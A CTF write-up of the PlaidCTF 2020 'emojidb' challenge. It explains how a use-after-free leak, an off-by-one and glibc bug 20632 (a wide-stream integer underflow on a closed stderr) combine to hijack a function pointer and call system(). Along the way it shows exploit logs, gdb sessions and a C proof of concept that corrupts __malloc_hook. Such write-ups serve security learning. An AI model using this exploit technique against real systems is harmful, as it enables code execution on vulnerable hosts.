# Emojidb (pwn)

This is a writeup about the emojidb challenge from [PlaidCTF](https://twitter.com/PlaidCTF) 2020. I usually don’t write about CTF challenges, but this one was really cool and some people were asking questions after I tweeted these [screenshots](https://twitter.com/AmarSaar/status/1252228158650060805) so I figured it would be nice to share and write this short analysis.

Before we start I want to thank the awesome [PlaidCTF](https://twitter.com/PlaidCTF) team, who every year oragnizes this amazing CTF for us to enjoy! Check it out next year if you haven't played.

## Finding bugs

First when I connected to the server it wasn't clear what was supposed to happen. The confusing part was that all strings were not in English, they were in... Emoji. Reversing the challenge wasn't an issue as the binary is fairly small and straightforward. Once I reversed it I understood the meaning of these emoji strings.

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/global_emojis.PNG)

The challenge is a small db that manages emojis, and it exposes the following interface commands:

* Add emoji, which is a Unicode string with controlled length up to 0x800 characters. The binary supports storing up to 4 emoji strings, as they're stored in a statically-allocated global array.

* Delete emoji, based on its index in the array.

* Print emoji, again given its index.

* Exit

It’s worth to mention here (well, the whole challenge is based on it...) that when the challenge reads an unsupported command, it checks if a global variable I called _is_write_to_stderr_enabled_ is != 0, and if so, it writes the input command to stderr. Interesting, keep this in mind for later. This global variable is set to 0 by default, and it doesn't seem like there's a way to control it.

## First primitive – information disclosure

The emoji global array holds the emoji db, each one represented by the *emoji_s* structure, which looks like this:

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/emoji_s.PNG)

When we add a new emoji string, the challenge looks for an unused structure, sets its is_used field to 1, and allocates a buffer for the actual string that will be stored in *emoji_s*. When we delete an emoji, it frees the buffer (without setting the pointer to NULL), and sets is_used back to 0.

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/delete_emoji.PNG)

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/print_emoji.PNG)	

The function _print_emoji()_ reads an index of the desired emoji, and calls ```fputws``` to print it and send it back to us. Problem is – it doesn't check if is_used != 0, it only checks if the pointer is not NULL.

With this bug, we can read the content of a dangling pointer from previous allocation that was already freed. As usual for dlmalloc, we can allocate a chunk, free it, and read the pointers to the main arena in libc. If we do that and set a breakpoint on the print_emoji function, we can see that the content that is about to be sent to us contains pointers:

```
amarsa@SaarAmar-book2:/mnt/c/CTFs/plaid2020/emojiDB/final$ python3 exploit.py
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] start pasten, attach gdb
[*] send ADD_EMOJI_CMD: A (0x400)
[*] send ADD_EMOJI_CMD: B (0x400)
[*] send ADD_EMOJI_CMD: C (0x400)
[*] send DELETE_EMOJI_CMD(2) -- create FD/BK pointers
[*] send PRINT_EMOJI_CMD(2), leak libc pointers
```

And:

```bash
(gdb) b *(0x7f06eac00000+0xe64)
Breakpoint 1 at 0x7f06eac00e64
(gdb) c
Continuing.

Breakpoint 1, 0x00007f06eac00e64 in ?? ()
(gdb) x/5i $rip
=> 0x7f06eac00e64:      test   %rdi,%rdi
   0x7f06eac00e67:      je     0x7f06eac00e80
   0x7f06eac00e69:      mov    0x2011f0(%rip),%rsi        # 0x7f06eae02060 <stdout>
   0x7f06eac00e70:      add    $0x8,%rsp
   0x7f06eac00e74:      jmpq   0x7f06eac00980 <fputws@plt>
(gdb) x/4gx $rdi
0x7fffdd4974f0: 0x00007f06ea7ebca0      0x00007f06ea7ebca0
0x7fffdd497500: 0x0000000000000000      0x0000000000000000
(gdb)
```

Great, we can leak uninitialized data. There's one tiny problem, we need convert back the data we got to its original binary representation, as _print_emoji()_ writes it to stdout using ```fputws``` which will encode the raw data as Unicode. This is easily achieved by calling ```mbstowcs()``` to convert it back. 

Awesome.

## Second primitive – off-by-one in add_emoji, corrupting is_write_to_stderr_enabled

The function _add_emoji_ has an off-by-one bug in the addition of a new emoji. It is supposed to fail when we already have 4 emojis in the array, but it actually checks if we have 5. This off-by-one causes it to write a new emoji_s structure even when the array is full, right after it, which happens to contain the interesting variable _is_write_to_stderr_enabled_. This is that same strange variable that was referenced only in main(). Apparently, if we use this off-by-one, we get the ability to write our commands into stderr. Interesting primitive... but what can we do with it?

First, let’s do a quick POC for that. If we try to allocate 5 emojis, and then free all of them, we can’t free the last one (since *print_emoji()* and *delete_emoji()* uses the same *get_emoji_from_g_arr()*, which doesn't have the off-by-one bug, and refuses to return an OOB object). We can then see that all the "unsupported cmd" bytes we send are actually being written to stderr (easy to see that with ```strace``` or by setting a breakpoint there).

## Last primitive - corruption

I reversed the whole binary and didn’t find another corruption primitives. I called my buddy [@tomash](https://twitter.com/tom41sh), sent him my idb and told him everything I have. He immediately said “ok, you’ve got all the primitives, the Unicode with the stderr is the core here. Look into that.”

There was actually another hint in that direction. The challenge is executed with this script:

```bash
amarsa@SaarAmar-book2:/mnt/c/CTFs/plaid2020/emojiDB/org/bin$ cat run.sh
#!/bin/sh
exec /home/ctf/emojidb 2>&-
```

The output redirection means that ```stderr``` is actually closed when the challenge runs. That's unusual. We clearly see that our commands can be written into this closed file descriptor.

It turns out that there is a bug in glibc we can trigger when we write into stderr, but it requires stderr to be closed. The bug is masked out if we execute the binary by itself, which is a huge pitfall ;). Always use a good reproduction environment ;)

If we run the challenge with stderr close and do this, it will segfault:

* Add 5 emojis, to write oob after the array and enable writing to stderr

* Send “AAAA”

```bash
amarsa@SaarAmar-book2:/mnt/c/CTFs/plaid2020/emojiDB/final$ python3 exploit.py
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] start pasten, attach gdb
[*] send ADD_EMOJI_CMD
[*] send ADD_EMOJI_CMD
[*] send ADD_EMOJI_CMD
[*] send ADD_EMOJI_CMD
[*] send ADD_EMOJI_CMD
[*] send "A"*0x50
```

And...

```
Program received signal SIGSEGV, Segmentation fault.
internal_utf8_loop (irreversible=0x7fffdda090f0, outend=0x7fffdda09220 "",
    outptrp=<synthetic pointer>, inend=0x7f86e47eb9e9 <_IO_wide_data_1+297> "\361\001",
    inptrp=0x7fffdda09180, step_data=0x7f86e47eb9b8 <_IO_wide_data_1+248>,
    step=<optimized out>) at ../iconv/loop.c:325
325     ../iconv/loop.c: No such file or directory.
(gdb) x/4i $rip
=> 0x7f86e4427420 <__gconv_transform_internal_utf8+336>:        mov    (%rax),%edx
   0x7f86e4427422 <__gconv_transform_internal_utf8+338>:        cmp    $0x7f,%edx
   0x7f86e4427425 <__gconv_transform_internal_utf8+341>:
    ja     0x7f86e4427580 <__gconv_transform_internal_utf8+688>
   0x7f86e442742b <__gconv_transform_internal_utf8+347>:        lea    0x1(%rbx),%rax
(gdb) i r rax
rax            0x7f8600000041   140213502345281
(gdb)
```

After doing some digging, I saw that there is an integer underflow in libc, in a calculation of the count of bytes we can allow to copy. This is super convenient, because we can corrupt freely in _IO_wide_data_1. As it happens, we have a function pointer that is being corrupted with our data, and rdi points before it. We already have the infoleak from before so we can calculate the address of system(), and from there it's clearly game over:

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/final.PNG)

And, just for fun, look at the TCP stream in UTF8:

![image](https://github.com/saaramar/emojidb_plaidctf2020/raw/master/docs/assets/cap_screenshot.PNG)	

## The vulnerability

While debugging, I was super curios about this issue. And, when the flag came, it actually referred us to an actual (super interesting) [vulnerability](https://sourceware.org/bugzilla/show_bug.cgi?id=20632) in glibc!. Check out this POC (taken directly from the bug report), which corrupts ```__malloc_hook``` to get an arbitrary jump:

```c
#include <stdio.h>
#include <wchar.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
   /* Close stderr */
   close(2);

   /* Output long string */
   const int sz = 4096;
   wchar_t *buff = calloc(sz+1, sizeof *buff);
   for (int i=0; i < sz; i++) buff[i] = L'x';
   fputws(buff, stderr);

   /* Output shorter string */
   for (int i=0; i < 1024; i++) {
     fputws(L"0123456789ABCDEF", stderr);

     /* Call malloc, which should not crash.
        However it will if malloc's function pointers
        have been stomped. */
     free(malloc(1));
   }
   return 0;
}
```

If we compile and run it:

```bash
amarsa@SaarAmar-book2:/mnt/c/CTFs/plaid2020/emojiDB/final$ gdb bin/bug_20632_poc
GNU gdb (Ubuntu 8.1-0ubuntu3.1) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bin/bug_20632_poc...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x7ae
Starting program: /mnt/c/CTFs/plaid2020/emojiDB/final/bin/bug_20632_poc

Temporary breakpoint 1, 0x00000000080007ae in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000003200000031 in ?? ()
(gdb) bt
#0  0x0000003200000031 in ?? ()
#1  0x000000000800084a in main ()
(gdb) x/4i 0x000000000800084a-5
   0x8000845 <main+155>:        callq  0x8000680 <malloc@plt>
   0x800084a <main+160>:        mov    %rax,%rdi
   0x800084d <main+163>:        callq  0x8000640 <free@plt>
   0x8000852 <main+168>:        addl   $0x1,-0x10(%rbp)
(gdb)
```

The bug report has a very well-written short analysis:

0. The initial large write calls into `_IO_wfile_overflow`. This has a bug that results in a FILE* that has _IO_write_ptr exceeding _IO_write_end by exactly 1
1. This bug is typically masked by the call to _IO_do_flush(), however this call doesn't successfully flush because stderr has been closed
2. The subsequent shorter writes call into `_IO_wfile_xsputn`. This calculates the available space in the buffer as `_IO_write_end - _IO_write_ptr` (a negative value) and stores the result in an unsigned value (i.e. huge). **Since it determines it has enough space, it writes arbitrarily much into _IO_write_ptr**



The code and POCs are in this [repo](https://github.com/saaramar/emojidb_plaidctf2020).